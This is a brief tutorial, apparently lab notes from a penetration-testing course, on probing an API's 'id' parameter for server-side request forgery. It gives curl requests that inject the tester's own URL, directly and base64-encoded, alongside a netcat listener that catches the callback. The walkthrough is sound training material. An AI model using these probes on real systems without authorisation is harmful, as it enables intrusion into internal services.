# Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) attacks, listed in the OWASP top 10, allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. We usually need to supply or modify URLs used by the target application to read or submit data.

#### Interact with the API

```bash
curl http://SERVER_IP:PORT/api/userinfo
{"success":false,"error":"'id' parameter is not given."}
```

#### Setup a Listener

Since it's expecting an id parameter, and it's a SSRF section setup a listener&#x20;

```bash
nc -nlvp 4444
listening on [any] 4444 ...
```

#### Make an API call

{% code overflow="wrap" %}
```bash
curl "http://SERVER_IP:PORT/api/userinfo?id=http://OUR_IP:4444"
{"success":false,"error":"'id' parameter is invalid."}
```
{% endcode %}

#### If unsuccessful, try to make an API call with encoded value

```bash
echo "http://OUR_IP:4444" | tr -d '\n' | base64
curl "http://SERVER_IP:PORT/api/userinfo?id=<BASE64 blob>"
```

